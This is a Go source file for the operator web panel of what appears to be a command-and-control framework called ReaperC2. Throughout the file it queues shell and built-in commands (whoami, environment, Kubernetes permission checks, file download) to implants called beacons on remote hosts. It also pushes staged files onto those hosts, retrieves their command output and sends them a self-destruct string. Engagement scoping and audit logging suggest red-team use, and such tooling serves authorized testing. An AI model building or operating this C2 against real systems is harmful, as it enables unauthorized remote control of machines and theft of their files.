package adminpanel

import (
	"context"
	"encoding/json"
	"html/template"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"ReaperC2/pkg/dbconnections"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
)

const maxQueuedCommandLen = 8000

// beaconSelfDestructCommand is queued for Scythe to exit on next heartbeat delivery.
const beaconSelfDestructCommand = "sendmetojesusdog"

// ScytheBuiltinCommands are commands handled by Scythe’s HTTP beacon built-ins (queue exactly as shown).
// Most are a single token; "download" is special — type the host path after the word (e.g. download C:\Windows\Temp\a.txt).
var ScytheBuiltinCommands = []string{"whoami", "groups", "environment", "kube-auth-can-i-list", "download"}

func beaconSelectLabel(c dbconnections.BeaconClientDocument) string {
	label := strings.TrimSpace(c.BeaconLabel)
	if label == "" {
		if len(c.ClientId) > 8 {
			return c.ClientId[:8] + "…"
		}
		return c.ClientId
	}
	return label
}

func (s *Server) handleCommandsPage(w http.ResponseWriter, r *http.Request) {
	user, role, ok := s.requireHTMLAuth(w, r)
	if !ok {
		return
	}
	eng, ok := s.requireActiveEngagement(w, r, user, role)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	clients, err := dbconnections.ListBeaconClientsByEngagement(ctx, eng.ID.Hex())
	if err != nil {
		log.Printf("admin: list clients for commands: %v", err)
		http.Error(w, "failed to load beacons", http.StatusInternalServerError)
		return
	}
	var opts strings.Builder
	for _, c := range clients {
		lbl := beaconSelectLabel(c)
		opts.WriteString(`<option value="`)
		opts.WriteString(template.HTMLEscapeString(c.ClientId))
		opts.WriteString(`">`)
		opts.WriteString(template.HTMLEscapeString(lbl + " — " + c.ClientId))
		opts.WriteString(`</option>`)
	}
	if opts.Len() == 0 {
		opts.WriteString(`<option value="">(no beacons — generate one under Beacons)</option>`)
	}
	var builtinOpts strings.Builder
	builtinOpts.WriteString(`<option value="">— Custom command below —</option>`)
	for _, b := range ScytheBuiltinCommands {
		builtinOpts.WriteString(`<option value="`)
		builtinOpts.WriteString(template.HTMLEscapeString(b))
		builtinOpts.WriteString(`">`)
		builtinOpts.WriteString(template.HTMLEscapeString(b))
		builtinOpts.WriteString(`</option>`)
	}

	body := `
<h1>Commands</h1>
<p class="muted cmd-page-lead">Pick one beacon, then queue text/JSON commands or stage a file and push it to the host. Results arrive on <code>POST /receive/&lt;uuid&gt;</code>; pending work ships on the next <code>GET /heartbeat/&lt;uuid&gt;</code>.</p>
<div class="card cmd-page-card">
  <div class="cmd-beacon-row">
    <label for="cmdBeacon">Beacon</label>
    <select id="cmdBeacon">` + opts.String() + `</select>
  </div>
  <div class="commands-two-col">
    <section class="commands-panel" aria-labelledby="cmd-queue-h">
      <h3 class="commands-h3" id="cmd-queue-h">Shell / Scythe command</h3>
      <label>Preset</label>
      <select id="cmdPreset">` + builtinOpts.String() + `</select>
      <label>Command</label>
      <textarea id="cmdText" placeholder="whoami · kube-auth-can-i-list · download C:\path\file.txt · {&quot;op&quot;:&quot;upload&quot;,…}" rows="3"></textarea>
      <button type="button" class="btn" id="queueBtn">Queue command</button>
      <p id="cmdMsg" class="cmd-inline-msg muted"></p>
    </section>
    <section class="commands-panel" aria-labelledby="cmd-up-h">
      <h3 class="commands-h3" id="cmd-up-h">Upload file to beacon</h3>
      <label>File</label>
      <input type="file" id="stageFile" />
      <button type="button" class="btn btn-secondary" id="stageBtn">Stage on server</button>
      <p id="stageMsg" class="cmd-inline-msg muted"></p>
      <input type="hidden" id="stagingId" value="" />
      <label>Remote path on beacon</label>
      <input type="text" id="remotePath" class="mono" placeholder="/tmp/x.png or C:\Users\Public\ — trailing / or \ uses staged file name" />
      <button type="button" class="btn" id="queueUploadBtn">Queue upload</button>
      <p id="uploadQueueMsg" class="cmd-inline-msg muted"></p>
    </section>
  </div>
  <details class="cmd-fold" open>
    <summary>Pending queue <span class="muted">· next heartbeat</span></summary>
    <div class="cmd-fold-body">
      <div id="pendingWrap" class="pending-table-wrap"><p class="muted">Loading…</p></div>
      <button type="button" class="btn btn-secondary btn-tiny" id="refPending">Refresh</button>
    </div>
  </details>
  <details class="cmd-fold">
    <summary>Files <span class="muted">· staging &amp; beacon downloads</span></summary>
    <div class="cmd-fold-body">
      <div class="cmd-fold-actions"><button type="button" class="btn btn-secondary btn-tiny" id="loadArt">Load list</button></div>
      <div id="artWrap"><p class="muted">Open and load to see staged uploads and downloaded files.</p></div>
    </div>
  </details>
  <details class="cmd-fold" open>
    <summary>Output history</summary>
    <div class="cmd-fold-body">
      <div class="cmd-fold-actions">
        <button type="button" class="btn btn-secondary btn-tiny" id="loadHist">Load history</button>
        <button type="button" class="btn btn-secondary btn-tiny" id="refHist">Refresh</button>
      </div>
      <div id="histWrap"><p class="muted">Load to view stored command output for the selected beacon.</p></div>
    </div>
  </details>
</div>
<script>
function renderPending(data) {
  var el = document.getElementById('pendingWrap');
  if (!data.beacons || data.beacons.length === 0) {
    el.innerHTML = '<p class="muted">No beacons registered.</p>';
    return;
  }
  var html = '<table><thead><tr><th>Beacon</th><th>Client ID</th><th>Pending commands</th></tr></thead><tbody>';
  for (var i = 0; i < data.beacons.length; i++) {
    var b = data.beacons[i];
    var pend = (b.pending && b.pending.length) ? b.pending.map(function(c) { return escapeHtml(c); }).join('<br>') : '<span class="muted">—</span>';
    html += '<tr><td>' + escapeHtml(b.label) + '</td><td class="mono">' + escapeHtml(b.client_id) + '</td><td style="font-size:.85rem">' + pend + '</td></tr>';
  }
  html += '</tbody></table>';
  el.innerHTML = html;
}
function escapeHtml(s) {
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}
async function loadPending() {
  var r = await fetch('/api/beacon-commands', { credentials: 'same-origin' });
  var j = await r.json().catch(function() { return {}; });
  if (!r.ok) { document.getElementById('pendingWrap').innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
  renderPending(j);
}
document.getElementById('cmdPreset').onchange = function() {
  var v = document.getElementById('cmdPreset').value;
  if (v === 'download') { document.getElementById('cmdText').value = 'download '; return; }
  if (v) { document.getElementById('cmdText').value = v; }
};
document.getElementById('queueBtn').onclick = async function() {
  var sel = document.getElementById('cmdBeacon');
  var cid = sel.value;
  var msg = document.getElementById('cmdMsg');
  msg.textContent = '';
  if (!cid) { msg.textContent = 'Select a beacon.'; return; }
  var cmd = document.getElementById('cmdText').value;
  if (!cmd.trim()) { msg.textContent = 'Enter a command or choose a built-in preset.'; return; }
  var body;
  var t = cmd.trim();
  if (t.charAt(0) === '{') {
    try {
      var obj = JSON.parse(cmd);
      body = JSON.stringify({ client_id: cid, command_obj: obj });
    } catch (e) {
      msg.textContent = 'Invalid JSON in command field.';
      return;
    }
  } else {
    body = JSON.stringify({ client_id: cid, command: cmd });
  }
  var r = await fetch('/api/beacon-commands', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: body });
  var j = await r.json().catch(function() { return {}; });
  if (r.ok) {
    msg.textContent = 'Queued.';
    document.getElementById('cmdText').value = '';
    document.getElementById('cmdPreset').value = '';
    loadPending();
    if (document.getElementById('cmdBeacon').value === cid) { loadCommandHistory(); }
  } else {
    msg.textContent = j.error || r.statusText;
  }
};
document.getElementById('stageBtn').onclick = async function() {
  var cid = document.getElementById('cmdBeacon').value;
  var fin = document.getElementById('stageFile').files[0];
  var el = document.getElementById('stageMsg');
  el.textContent = '';
  if (!cid) { el.textContent = 'Select a beacon.'; return; }
  if (!fin) { el.textContent = 'Choose a file.'; return; }
  var fd = new FormData();
  fd.append('client_id', cid);
  fd.append('file', fin);
  fd.append('filename', fin.name);
  var r = await fetch('/api/beacon-staging', { method: 'POST', credentials: 'same-origin', body: fd });
  var j = await r.json().catch(function() { return {}; });
  if (r.ok) {
    el.textContent = 'Staged. staging_id=' + j.staging_id;
    document.getElementById('stagingId').value = j.staging_id || '';
  } else {
    el.textContent = j.error || r.statusText;
  }
};
document.getElementById('queueUploadBtn').onclick = async function() {
  var cid = document.getElementById('cmdBeacon').value;
  var sid = document.getElementById('stagingId').value.trim();
  var rp = document.getElementById('remotePath').value.trim();
  var el = document.getElementById('uploadQueueMsg');
  var btn = document.getElementById('queueUploadBtn');
  el.textContent = '';
  if (!cid) { el.textContent = 'Select a beacon.'; return; }
  if (!sid) { el.textContent = 'Stage a file first (staging_id).'; return; }
  if (!rp) { el.textContent = 'Enter remote path on beacon.'; return; }
  el.textContent = 'Queueing…';
  if (btn) btn.disabled = true;
  try {
    var r = await fetch('/api/beacon-commands', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ client_id: cid, upload: { staging_id: sid, remote_path: rp } }) });
    var j = await r.json().catch(function() { return {}; });
    if (r.ok) {
      el.textContent = 'Upload command queued.';
      loadPending();
    } else {
      el.textContent = (j && j.error) ? j.error : (r.status + ' ' + r.statusText);
    }
  } catch (e) {
    el.textContent = 'Request failed: ' + e;
  } finally {
    if (btn) btn.disabled = false;
  }
};
async function loadArtifactsList() {
  var cid = document.getElementById('cmdBeacon').value;
  var el = document.getElementById('artWrap');
  if (!cid) { el.innerHTML = '<p class="muted">Select a beacon.</p>'; return; }
  el.innerHTML = '<p class="muted">Loading…</p>';
  var r = await fetch('/api/beacon-artifacts?client_id=' + encodeURIComponent(cid), { credentials: 'same-origin' });
  var j = await r.json().catch(function() { return {}; });
  if (!r.ok) { el.innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
  if (!j.artifacts || j.artifacts.length === 0) {
    el.innerHTML = '<p class="muted">No files yet.</p>';
    return;
  }
  var html = '<table class="artifacts-table"><thead><tr><th>Kind</th><th>Name / path</th><th>Size</th><th>Time (UTC)</th><th>Actions</th></tr></thead><tbody>';
  for (var i = 0; i < j.artifacts.length; i++) {
    var a = j.artifacts[i];
    var label = a.original_filename || a.remote_path || '—';
    var dl = '<a href="/api/beacon-artifacts/' + encodeURIComponent(a.id) + '/file" download>Download</a>';
    var del = ' <button type="button" class="btn-tiny btn-kill btn-del-artifact" data-artifact-id="' + escapeHtml(a.id) + '">Delete</button>';
    html += '<tr><td>' + escapeHtml(a.kind) + '</td><td class="mono" style="font-size:.85rem">' + escapeHtml(label) + '</td><td>' + a.byte_size + '</td><td class="mono" style="font-size:.75rem">' + escapeHtml(a.created_at) + '</td><td style="white-space:nowrap">' + dl + del + '</td></tr>';
  }
  html += '</tbody></table>';
  el.innerHTML = html;
  el.querySelectorAll('.btn-del-artifact').forEach(function(btn) {
    btn.onclick = async function() {
      var aid = btn.getAttribute('data-artifact-id');
      if (!aid || !confirm('Delete this file from ReaperC2 storage? This cannot be undone.')) return;
      var dr = await fetch('/api/beacon-artifacts/' + encodeURIComponent(aid) + '?client_id=' + encodeURIComponent(cid), { method: 'DELETE', credentials: 'same-origin' });
      var dj = await dr.json().catch(function() { return {}; });
      if (!dr.ok) { alert((dj && dj.error) ? dj.error : (dr.status + ' ' + dr.statusText)); return; }
      var hid = document.getElementById('stagingId');
      if (hid && hid.value === aid) { hid.value = ''; var sm = document.getElementById('stageMsg'); if (sm) sm.textContent = ''; }
      loadArtifactsList();
    };
  });
}
document.getElementById('loadArt').onclick = function() { loadArtifactsList(); };
document.getElementById('refPending').onclick = function() { loadPending(); };
document.getElementById('cmdBeacon').addEventListener('change', function() { loadPending(); });
loadPending();
async function loadCommandHistory() {
  var cid = document.getElementById('cmdBeacon').value;
  var el = document.getElementById('histWrap');
  if (!cid) { el.innerHTML = '<p class="muted">Select a beacon.</p>'; return; }
  el.innerHTML = '<p class="muted">Loading…</p>';
  var r = await fetch('/api/beacon-command-output?client_id=' + encodeURIComponent(cid) + '&limit=200', { credentials: 'same-origin' });
  var j = await r.json().catch(function() { return {}; });
  if (!r.ok) { el.innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
  if (!j.entries || j.entries.length === 0) {
    el.innerHTML = '<p class="muted">No stored output for this beacon yet.</p>';
    return;
  }
  var html = '<table class="cmd-history-table"><thead><tr><th class="cmd-history-time">Time (UTC)</th><th class="cmd-history-th-cmd">Command</th><th class="cmd-history-th-out">Output</th></tr></thead><tbody>';
  for (var i = 0; i < j.entries.length; i++) {
    var e = j.entries[i];
    html += '<tr><td class="mono cmd-history-time">' + escapeHtml(e.timestamp) + '</td><td class="cmd-history-cmd-cell"><pre class="mono cmd-history-cmd-pre">' + escapeHtml(e.command) + '</pre></td><td class="cmd-history-out-cell"><pre class="mono cmd-history-out">' + escapeHtml(e.output) + '</pre></td></tr>';
  }
  html += '</tbody></table>';
  el.innerHTML = html;
}
document.getElementById('loadHist').onclick = function() { loadCommandHistory(); };
document.getElementById('refHist').onclick = function() { loadCommandHistory(); };
</script>`
	s.writeAppPage(w, user, role, "commands", "Commands", body, eng)
}

func (s *Server) handleAPIBeaconCommands(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		s.handleAPIBeaconCommandsGET(w, r)
	case http.MethodPost:
		s.handleAPIBeaconCommandsPOST(w, r)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleAPIBeaconCommandsGET(w http.ResponseWriter, r *http.Request) {
	user, role, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	eng, ok := s.engagementForAPI(w, r, user, role)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	clients, err := dbconnections.ListBeaconClientsByEngagement(ctx, eng.ID.Hex())
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	type row struct {
		ClientID string   `json:"client_id"`
		Label    string   `json:"label"`
		Pending  []string `json:"pending"`
	}
	var out []row
	for _, c := range clients {
		pending := dbconnections.StringifyBeaconCommands(c.Commands)
		out = append(out, row{
			ClientID: c.ClientId,
			Label:    beaconSelectLabel(c),
			Pending:  pending,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{"beacons": out})
}

type enqueueCommandRequest struct {
	ClientID   string                 `json:"client_id"`
	Command    string                 `json:"command"`
	CommandObj map[string]interface{} `json:"command_obj"`
	Upload     *struct {
		RemotePath string `json:"remote_path"`
		StagingID  string `json:"staging_id"`
	} `json:"upload"`
}

func (s *Server) handleAPIBeaconCommandsPOST(w http.ResponseWriter, r *http.Request) {
	actor, role, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	eng, ok := s.engagementForAPI(w, r, actor, role)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, dbconnections.ScytheMaxFileBytes+8<<20)
	var req enqueueCommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid json")
		return
	}
	req.ClientID = strings.TrimSpace(req.ClientID)
	req.Command = strings.TrimSpace(req.Command)
	if req.ClientID == "" {
		jsonError(w, http.StatusBadRequest, "client_id required")
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 120*time.Second)
	defer cancel()
	if !clientBelongsToEngagement(ctx, req.ClientID, eng.ID.Hex()) {
		jsonError(w, http.StatusForbidden, "beacon is not in this engagement")
		return
	}

	var toQueue []interface{}
	var auditPreview string

	switch {
	case req.Upload != nil && strings.TrimSpace(req.Upload.StagingID) != "" && strings.TrimSpace(req.Upload.RemotePath) != "":
		sidHex := strings.TrimSpace(req.Upload.StagingID)
		oid, err := primitive.ObjectIDFromHex(sidHex)
		if err != nil {
			jsonError(w, http.StatusBadRequest, "invalid staging_id")
			return
		}
		meta, err := dbconnections.FindFileArtifact(ctx, oid)
		if err != nil || meta.Kind != dbconnections.FileArtifactKindStaging || meta.ClientID != req.ClientID {
			jsonError(w, http.StatusBadRequest, "staging artifact not found for this beacon")
			return
		}
		remote := ResolveRemoteUploadPathForStaging(req.Upload.RemotePath, meta.OriginalFilename)
		// Store only a staging reference in MongoDB; FetchAndClearCommands expands to content_base64 at heartbeat delivery.
		toQueue = []interface{}{map[string]interface{}{
			"op":         "upload",
			"path":       remote,
			"staging_id": sidHex,
		}}
		auditPreview = "upload:" + remote + " (staging)"

	case len(req.CommandObj) > 0:
		toQueue = []interface{}{req.CommandObj}
		b, _ := json.Marshal(req.CommandObj)
		auditPreview = string(b)
		if len(b) > maxQueuedCommandLen*100 {
			jsonError(w, http.StatusBadRequest, "command_obj too large — use staging upload instead")
			return
		}

	case req.Command != "":
		if utf8.RuneCountInString(req.Command) > maxQueuedCommandLen {
			jsonError(w, http.StatusBadRequest, "command too long")
			return
		}
		toQueue = []interface{}{req.Command}
		auditPreview = req.Command

	default:
		jsonError(w, http.StatusBadRequest, "provide command, command_obj, or upload")
		return
	}

	err := dbconnections.AppendBeaconCommands(ctx, req.ClientID, toQueue)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			jsonError(w, http.StatusNotFound, "beacon not found")
			return
		}
		log.Printf("admin: queue command: %v", err)
		jsonError(w, http.StatusInternalServerError, "queue failed")
		return
	}
	if err := dbconnections.InsertAuditLog(ctx, actor, dbconnections.AuditActionBeaconCommandQueued, bson.M{
		"client_id": req.ClientID,
		"command":   auditPreview,
		"length":    utf8.RuneCountInString(auditPreview),
	}, eng.ID.Hex()); err != nil {
		log.Printf("admin: audit command queue: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "queued"})
}

func (s *Server) handleAPIBeaconCommandOutput(w http.ResponseWriter, r *http.Request) {
	user, role, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	eng, ok := s.engagementForAPI(w, r, user, role)
	if !ok {
		return
	}
	clientID := strings.TrimSpace(r.URL.Query().Get("client_id"))
	if clientID == "" {
		jsonError(w, http.StatusBadRequest, "client_id required")
		return
	}
	limit := int64(100)
	if v := r.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 && n <= 500 {
			limit = n
		}
	}
	ctx, cancel := context.WithTimeout(r.Context(), 20*time.Second)
	defer cancel()
	if !clientBelongsToEngagement(ctx, clientID, eng.ID.Hex()) {
		jsonError(w, http.StatusForbidden, "beacon is not in this engagement")
		return
	}
	exists, err := dbconnections.BeaconClientExists(ctx, clientID)
	if err != nil {
		log.Printf("admin: beacon exists: %v", err)
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	if !exists {
		jsonError(w, http.StatusNotFound, "beacon not found")
		return
	}
	rows, err := dbconnections.ListCommandOutputForClient(ctx, clientID, limit)
	if err != nil {
		log.Printf("admin: list command output: %v", err)
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	type entry struct {
		ID        string `json:"id"`
		Command   string `json:"command"`
		Output    string `json:"output"`
		Timestamp string `json:"timestamp"`
	}
	var entries []entry
	for _, rec := range rows {
		entries = append(entries, entry{
			ID:        rec.ID.Hex(),
			Command:   rec.Command,
			Output:    rec.Output,
			Timestamp: rec.Timestamp.UTC().Format(time.RFC3339),
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"client_id": clientID,
		"entries":   entries,
	})
}

type beaconKillRequest struct {
	ClientID string `json:"client_id"`
}

func (s *Server) handleAPIBeaconKill(w http.ResponseWriter, r *http.Request) {
	actor, role, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	eng, ok := s.engagementForAPI(w, r, actor, role)
	if !ok {
		return
	}
	var req beaconKillRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid json")
		return
	}
	req.ClientID = strings.TrimSpace(req.ClientID)
	if req.ClientID == "" {
		jsonError(w, http.StatusBadRequest, "client_id required")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	if !clientBelongsToEngagement(ctx, req.ClientID, eng.ID.Hex()) {
		jsonError(w, http.StatusForbidden, "beacon is not in this engagement")
		return
	}
	err := dbconnections.AppendBeaconCommands(ctx, req.ClientID, []interface{}{beaconSelfDestructCommand})
	if err != nil {
		if err == mongo.ErrNoDocuments {
			jsonError(w, http.StatusNotFound, "beacon not found")
			return
		}
		log.Printf("admin: beacon kill queue: %v", err)
		jsonError(w, http.StatusInternalServerError, "queue failed")
		return
	}
	if err := dbconnections.InsertAuditLog(ctx, actor, dbconnections.AuditActionBeaconKillQueued, bson.M{
		"client_id": req.ClientID,
		"command":   beaconSelfDestructCommand,
	}, eng.ID.Hex()); err != nil {
		log.Printf("admin: audit beacon kill: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "queued", "command": beaconSelfDestructCommand})
}
